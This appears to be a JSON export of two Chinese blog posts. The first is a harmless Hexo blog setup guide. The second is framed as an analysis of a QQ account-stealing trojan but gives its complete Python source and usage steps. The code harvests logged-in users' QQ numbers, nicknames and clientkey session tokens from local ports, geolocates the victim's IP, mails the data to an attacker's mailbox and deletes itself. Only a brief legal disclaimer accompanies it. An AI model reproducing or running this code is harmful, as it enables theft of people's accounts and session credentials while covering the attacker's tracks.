[{"title":"Hexo博客安装教程及个人心得","path":"/2025/04/26/20250426/","content":"安装教程（Windows端不建议使用Cmd终端，建议使用类Unix的Git） 安装 Node.js 首先，需要在电脑上安装 Node.js。Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行时环境，Hexo 依赖它来运行。 前往Node.js 官方网站，根据自己的操作系统下载相应的安装包进行安装。安装过程中可以选择默认设置一路点击 “下一步”。安装完成后，在命令行中输入node -v和npm -v，如果能输出版本号，则说明安装成功。 安装 Git Git 是一个分布式版本控制系统，用于管理 Hexo 项目的版本和与远程仓库进行交互。 访问Git 官方网站下载适合你操作系统的安装程序。安装时可以选择默认选项，不过在一些选项上可以根据自己的需求进行设置，比如选择是否将 Git 添加到系统环境变量等，一般默认设置就能满足大多数需求。安装完成后，在命令行中输入git --version，若能显示出版本信息，则表示安装成功。 创建博客目录 在你希望存放博客文件的地方，比如D:\\hexo或~/Documents/hexo（Windows 和 LinuxmacOS 系统分别对应的路径示例），创建一个文件夹，用于存放 Hexo 博客的所有文件。 初始化 Hexo 项目 (Windows端建议Windows11或Windows10) 打开命令行工具，切换到刚才创建的博客目录。例如在 Windows 系统中，可以使用cd D:\\hexo命令进入该目录。 执行npm install -g hexo-cli命令，全局安装 Hexo 命令行工具。安装完成后，执行hexo init命令初始化 Hexo 项目。这会在当前目录下生成一系列 Hexo 项目所需的文件和文件夹，包括node_modules（存放项目依赖的模块）、public（用于存放生成的静态网页文件）、scaffolds（模板文件目录）、source（存放博客文章等源文件的目录）以及package.json（项目配置文件）等。（写文章还是用typecho好用） 安装依赖 在项目目录下执行npm install命令，安装 Hexo 项目所需的各种依赖包。这些依赖包包括用于生成静态网页的工具、主题相关的组件等。 启动本地服务器 执行hexo server或hexo s命令启动本地服务器。默认情况下，Hexo 会在http://localhost:4000端口上运行服务器。此时，打开浏览器，访问该地址，就可以看到默认的 Hexo 博客页面，说明 Hexo 博客已经安装成功并可以正常运行。 个人心得 选择合适的主题很重要：Hexo 有许多精美的主题可供选择，一个合适的主题能让你的博客在视觉上更吸引人。在选择主题时，要考虑自己博客的定位和风格，比如如果你是技术博客，可能简洁明了、注重代码展示的主题更适合；如果是个人生活博客，可以选择更具个性化和艺术感的主题。同时，要注意主题的兼容性和可定制性，有些主题可能在不同版本的 Hexo 或不同浏览器上存在显示问题，而且可定制性强的主题能让你更好地按照自己的想法来调整博客的布局和样式。 善于利用插件扩展功能：Hexo 的插件生态也比较丰富，通过安装插件可以为博客添加各种实用的功能，如添加评论系统、文章阅读量统计、SEO 优化等。例如，使用hexo-generator-feed插件可以生成 RSS 订阅源，方便读者订阅你的博客更新；使用hexo-deployer-git插件可以方便地将博客部署到远程 Git 仓库。在使用插件时，要仔细阅读插件的文档，了解其配置方法和使用注意事项，确保插件能够正确地集成到你的博客中。 文章写作和管理要规范：为了方便管理和提高写作效率，建议在写作文章时遵循一定的规范。比如，在文章的开头使用正确的 Front Matter（元数据）来设置文章的标题、日期、分类、标签等信息，这样可以让 Hexo 更好地对文章进行分类和展示。同时，可以使用一些文本编辑器来编写文章，这些编辑器通常具有 Markdown 语法支持和代码高亮等功能，能让写作过程更加流畅和高效。另外，要定期对文章进行备份，防止数据丢失。 部署和维护要注意细节：将博客部署到服务器上供他人访问时，要注意选择合适的部署方式和服务器环境。如果是使用 GitHub Pages 等免费服务，要遵守其相关规定和限制；如果是自己搭建服务器，要注意服务器的安全性和性能优化。在日常维护中，要及时更新 Hexo 版本、主题和插件，以获取新的功能和修复已知的漏洞。同时，要关注博客的访问量和用户反馈，根据这些信息来调整博客的内容和布局，以提高用户体验。"},{"title":"QQ盗号木马原理分析及源码","path":"/2025/04/25/welcome/","content":"整体概述此代码的主要功能是尝试从本地端口获取在线 QQ 的相关信息，像 QQ 号、昵称、clientkey 等，接着把这些信息通过邮件发送出去，最后删除自身文件。 代码详细分析1. 导入必要的库import smtplibfrom email.mime.text import MIMETextimport requestsimport reimport sys,os smtplib：用来实现 SMTP 协议，达成邮件的发送。 email.mime.text.MIMEText：用于构建邮件内容。 requests：用于发送 HTTP 请求。 re：正则表达式库，用于从响应文本里提取所需信息。 sys 和 os：提供系统相关功能，如获取命令行参数、文件操作等。 2. 初始化计数器count = 0 count 用于记录邮件发送失败的次数。 3. 定义 get_info 函数def get_info(port): session = requests.session() login_html = session.get( https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url=https://qzs.qq.com/qzone/v5/loginsucc.html?para=izone) q_cookies = login_html.cookies.get_dict() pt_local_token = q_cookies.get(pt_local_token) params = callback: ptui_getuins_CB, r: 0.8987470931280881, pt_local_tk: pt_local_token headers = Referer: https://xui.ptlogin2.qq.com/, Host: flocalhost.ptlogin2.qq.com:port, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0 get_uins_req = session.get(fhttps://localhost.ptlogin2.qq.com:port/pt_get_uins, params=params, cookies=q_cookies, headers=headers, timeout=3) uins = re.findall(uin:(\\d+),get_uins_req.text) nickname = re.findall(nickname:(.*?),get_uins_req.text) result = [] i = 0 for uin in uins: params = clientuin:uin, r:0.9059695467741018, pt_local_tk:pt_local_token, callback:__jp0 ck_req = session.get(fhttps://localhost.ptlogin2.qq.com:port/pt_get_st,params=params,cookies=q_cookies,headers=headers) ck_cookies = ck_req.cookies.get_dict() ck_cookies[nickname] = nickname[i] result.append(ck_cookies) i += 1 return result 该函数的作用是从指定端口获取在线 QQ 的相关信息。 首先，创建一个 requests 会话，向登录页面发送请求，获取 pt_local_token。 然后，向 pt_get_uins 接口发送请求，运用正则表达式从响应文本中提取 QQ 号和昵称。 最后，针对每个 QQ 号，向 pt_get_st 接口发送请求，获取 clientkey，并把这些信息存储在列表中返回。 4. 主循环部分while True: try: while True: result = [] i = 4300 while i 4320: try: info = get_info(i) print(info) for j in info: if not j.get(clientkey): break else: result.extend(info) i += 1 continue continue except: i += 1 print(i,failed) continue result = [i for x,i in enumerate(result) if i not in result[:x]] print(result) if result: break 外层 while True 循环用于持续尝试，直至成功获取到有效的 QQ 信息。 中间的 while True 循环会遍历从 4300 到 4319 的端口，调用 get_info 函数获取信息。 内层 while 循环会检查获取的信息中是否包含 clientkey，若包含则添加到结果列表中。 最后，对结果列表进行去重操作。 5. 获取 IP 地址信息try: ip_data = requests.get(https://qifu-api.baidubce.com/ip/local/geo/v1/district).json() if ip_data.get(code) == Success: ip = ip_data.get(ip) country = ip_data.get(data).get(country) city = ip_data.get(data).get(city) district = ip_data.get(data).get(district) else: ip = 未知 country = 未知 city = 未知 district = 未知except: ip = 未知 country = 未知 city = 未知 district = 未知 向百度 IP 地址查询接口发送请求，获取当前 IP 地址的地理位置信息。若请求失败或者返回结果异常，则将信息设为 “未知”。 6. 构建邮件内容content = f------------------------------------------------------ip:ipTip: 如果邮件标题地址显示不全请访问 https://www.ip138.com 使用上方ip手动查询地址Tip: 新版本搭建包已移除获取登录网址的功能,如需使用请转至QQKey_Tool的Key解析器使用------------------------------------------------------ if not result: content = ERROR:未获取到任何在线的QQ!for i in result: content += f昵称:i.get(nickname)QQ号:i.get(clientuin)clientkey:i.get(clientkey)------------------------------------------------------ 依据获取到的 IP 地址信息和 QQ 信息构建邮件内容。若未获取到 QQ 信息，则显示错误信息。 7. 发送邮件while True: # 创建邮件对象 msg = MIMEText(content) msg[Subject] = f[QQKey_Tool] 获取到来自country+city+district某人的key msg[From] = XXX@163.com # 这里替换为你的发件邮箱 msg[To] = XXX@163.com # 这里替换为收件人的邮箱 # 登录SMTP服务器并发送邮件 try: count += 1 server = smtplib.SMTP(smtp.163.com, 25) # 启动TLS加密模式 server.starttls() # 登录邮箱账号 server.login(XXX@163.com, XXX) # 这里替换为你的发件邮箱和密码 # 发送邮件 server.sendmail(msg[From], msg[To], msg.as_string()) server.quit() break except Exception as e: if count = 3: break 构建邮件对象，设置邮件主题、发件人、收件人。 借助 smtplib 连接到 163 的 SMTP 服务器，启动 TLS 加密，登录邮箱账号并发送邮件。若发送失败，最多重试 3 次。 8. 删除自身文件if os.path.basename(sys.executable) != python.exe: os.chdir(os.path.dirname(sys.executable))path = sys.argv[0]print(path)with open(1.bat, w, encoding=gbk) as f: f.write(f@echo off ping -n 1 127.0.0.1nul del path del %0)os.startfile(1.bat)sys.exit(0) 若当前执行的不是 Python 解释器，就切换到当前执行文件所在的目录。 创建一个批处理文件 1.bat，内容为删除当前执行文件和批处理文件本身。 执行批处理文件，最后退出程序。 源码：import smtplibfrom email.mime.text import MIMETextimport requestsimport reimport sys, oscount = 0def get_info(port): session = requests.session() login_html = session.get( https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url=https://qzs.qq.com/qzone/v5/loginsucc.html?para=izone) q_cookies = login_html.cookies.get_dict() pt_local_token = q_cookies.get(pt_local_token) params = callback: ptui_getuins_CB, r: 0.8987470931280881, pt_local_tk: pt_local_token headers = Referer: https://xui.ptlogin2.qq.com/, Host: flocalhost.ptlogin2.qq.com:port, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0 get_uins_req = session.get(fhttps://localhost.ptlogin2.qq.com:port/pt_get_uins, params=params, cookies=q_cookies, headers=headers, timeout=3) uins = re.findall(uin:(\\d+), get_uins_req.text) nickname = re.findall(nickname:(.*?), get_uins_req.text) result = [] i = 0 for uin in uins: params = clientuin: uin, r: 0.9059695467741018, pt_local_tk: pt_local_token, callback: __jp0 ck_req = session.get(fhttps://localhost.ptlogin2.qq.com:port/pt_get_st, params=params, cookies=q_cookies, headers=headers) ck_cookies = ck_req.cookies.get_dict() ck_cookies[nickname] = nickname[i] result.append(ck_cookies) i += 1 return resultwhile True: try: while True: result = [] i = 4300 while i 4320: try: info = get_info(i) print(info) for j in info: if not j.get(clientkey): break else: result.extend(info) i += 1 continue continue except: i += 1 print(i, failed) continue result = [i for x, i in enumerate(result) if i not in result[:x]] print(result) if result: break try: ip_data = requests.get(https://qifu-api.baidubce.com/ip/local/geo/v1/district).json() if ip_data.get(code) == Success: ip = ip_data.get(ip) country = ip_data.get(data).get(country) city = ip_data.get(data).get(city) district = ip_data.get(data).get(district) else: ip = 未知 country = 未知 city = 未知 district = 未知 except: ip = 未知 country = 未知 city = 未知 district = 未知 content = f------------------------------------------------------ip:ipTip: 如果邮件标题地址显示不全请访问 https://www.ip138.com 使用上方ip手动查询地址Tip: 新版本搭建包已移除获取登录网址的功能,如需使用请转至QQKey_Tool的Key解析器使用------------------------------------------------------ if not result: content = ERROR:未获取到任何在线的QQ! for i in result: content += f昵称:i.get(nickname)QQ号:i.get(clientuin)clientkey:i.get(clientkey)------------------------------------------------------ # 配置SMTP服务器信息 while True: # 创建邮件对象 msg = MIMEText(content) msg[Subject] = f[QQKey_Tool] 获取到来自country + city + district某人的key msg[From] = XXX@163.com # 这里替换为你的发件邮箱 msg[To] = XXX@163.com # 这里替换为收件人的邮箱 # 登录SMTP服务器并发送邮件 try: count += 1 server = smtplib.SMTP(smtp.163.com, 25) # 启动TLS加密模式 server.starttls() # 登录邮箱账号 server.login(XXX@163.com, XXX) # 这里替换为你的发件邮箱和密码 # 发送邮件 server.sendmail(msg[From], msg[To], msg.as_string()) server.quit() break except Exception as e: if count = 3: break break except Exception as e: print(repr(e)) continueif os.path.basename(sys.executable) != python.exe: os.chdir(os.path.dirname(sys.executable))path = sys.argv[0]print(path)with open(1.bat, w, encoding=gbk) as f: f.write(f@echo off ping -n 1 127.0.0.1nul del path del %0)os.startfile(1.bat)sys.exit(0) 使用教程pip install requests python main.py 注意事项此代码可能会涉及到侵犯他人隐私和违反相关法律法规的问题，在使用时必须确保遵守法律规定。 问题请私聊QQ:3242515521"}]